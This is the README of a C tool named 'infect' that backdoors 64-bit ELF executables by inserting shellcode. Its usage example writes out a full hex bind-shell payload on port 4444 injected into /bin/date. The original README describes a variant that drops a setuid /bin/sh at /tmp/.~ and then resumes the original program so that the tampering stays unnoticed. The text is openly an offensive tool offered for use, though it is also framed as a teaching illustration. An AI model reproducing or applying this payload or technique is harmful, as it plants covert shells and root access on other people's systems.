infect
------

> Simple C program to backdoor ELF executables

This is a simple program, written in C, to add arbitrary shellcode to 64bit ELF
executables. This is a heavily modified version of `infect` from the ELFKickers
project from Muppet Labs.

Usage
-----
```
Usage: ./infect
  -f: Path to 64bit ELF binary to infect with the payload.
  -p: Hex encoding of the payload.
  -v: Be verbose.
  -l: Only show how much room is available for a payload.

Example:
./infect -f /bin/date -p 6a2958996a025f6a015e0f05489752c \
704240200115c4889e66a105a6a31580f056a32580f054831f66a2b580f \
0548976a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f73680 \
0534889e752574889e60f05

Infects /bin/date with a bind shell on port 4444
```

Build
-----

This project uses `make` to build.

Original README
---------------
infect provides a very simple example of how an ELF executable can be
subverted to compromise security. (Of course, this is not a very
practical approach if compromising security is really your goal, since
it requires already having write access to someone else's executables.
The true purpose here is simply to illustrate one technique for
surgically altering ELF files.)

Given a 64-bit ELF executable file, this program inserts into it a
snippet of malicious code. When the modified executable is next
invoked, the added code creates a file named "/tmp/.~", a 32-bit ELF
executable that simply invokes /bin/sh, and has the set-user-ID bit
set. The added code then jumps to the original program so that the
modified executable shows no obvious sign of having been tampered
with.

infect takes advantage of the fact that most ELF executables are laid
out with a significant chunk of unused padding bytes immediately
following the executable segment. infect simply extends the size of
the executable segment to include enough extra bytes to hold the new
code, and then changes the executable's entry point.

The malicious code provided with infect is very simple, and only
requires 116 bytes. (58 of those bytes are for the generated ELF
executable.) Further analysis of this assembly code is left as an
exercise for the reader.

License
-------
- Copyright (c) 2011 Brian Raiter <breadbox@muppetlabs.com>
- Copyright (c) 2018 <brimstone@the.narro.ws>

License GPLv2+: GNU GPL version 2 or later. This is free software: you
are free to change and redistribute it. There is NO WARRANTY, to the
extent permitted by law.
